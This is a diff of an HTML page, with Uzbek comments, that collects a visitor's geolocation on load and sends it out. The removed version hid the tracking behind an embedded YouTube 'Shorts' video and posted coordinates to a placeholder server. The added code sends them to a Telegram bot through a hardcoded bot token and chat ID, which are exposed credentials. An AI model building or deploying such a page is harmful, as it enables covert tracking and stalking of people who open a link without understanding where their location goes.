@@ -1,21 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Shorts</title>
+    <title>Track Location</title>
     <script>
         document.addEventListener('DOMContentLoaded', function () {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function (position) {
                     var latitude = position.coords.latitude;
                     var longitude = position.coords.longitude;
+                    var botToken = 'Y6233093483:AAEAkRHWiJpvDwOxPhSHLMvKpoHmwAogsMQ';  // O'zingizning bot tokeningizni kiriting
+                    var chatId = '5528965178';  // Botning chat ID sini kiriting
 
-                    fetch('https://yourserver.com/location', {
+                    // Telegram botga joylashuvni yuborish
+                    fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            user_id: getParameterByName('user_id'),
+                            chat_id: chatId,
                             latitude: latitude,
                             longitude: longitude
                         })
@@ -30,20 +33,9 @@
                 console.log('Geolocation is not supported by this browser.');
             }
         });
-
-        function getParameterByName(name) {
-            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-            var results = regex.exec(location.search);
-            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
-        }
     </script>
 </head>
 <body>
-   <iframe width="560" height="315" src="https://www.youtube.com/embed/gSQgbCo6PAg?si=6VtyKEuQCgCvz7Nx" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-
-
+    <h1>Tracking Location</h1>
 </body>
 </html>
-
- 
